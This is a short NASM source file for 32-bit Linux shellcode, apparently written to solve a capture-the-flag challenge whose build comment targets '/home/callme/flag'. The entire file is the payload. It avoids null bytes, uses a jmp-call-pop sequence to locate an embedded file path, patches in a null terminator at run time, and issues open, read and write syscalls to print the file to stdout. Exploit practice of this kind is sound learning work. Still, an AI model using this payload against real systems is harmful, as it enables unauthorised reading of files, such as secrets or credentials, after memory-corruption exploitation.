;
;	build with nasm sc.asm -o sc.bin -DFILENAME=\"/home/callme/flag\" -DSIZE=0x40
;
USE32

	section .data	; for testing
	global _start

; setup env
_start:
	xor eax, eax
	mov al, 0x10
	shl eax, 0x8
	sub esp, eax	; esp - 0x1000
	xor ebx, ebx
	xor esi, esi
	xor ecx, ecx
	mul ecx		; edx:eax = 0

	jmp filenm
open:
	pop ebx
	mov edi, ebx
	xor eax, eax
	mov al, 0x90	; search for nop
	mov cl, 0xff	; search up to 255 bytes
	cld
	repne scasb
	dec edi
	xor ecx, ecx
	mov [edi], cl	; put the null byte
	xor eax, eax
	mov al, 0x5
	int 80h
read:
	mov ebx, eax
	mov ecx, esp
	mov dl, SIZE
	xor eax, eax
	mov al, 0x3
	int 80h
write:
	mov edx, eax
	xor ebx, ebx
	inc ebx
	mov ecx, esp
	xor eax, eax	
	mov al, 0x4
	int 80h

exit:
	xor eax, eax
	mov al, 0x1
	int 80h

filenm:
	call open
	db FILENAME
fend:
	nop
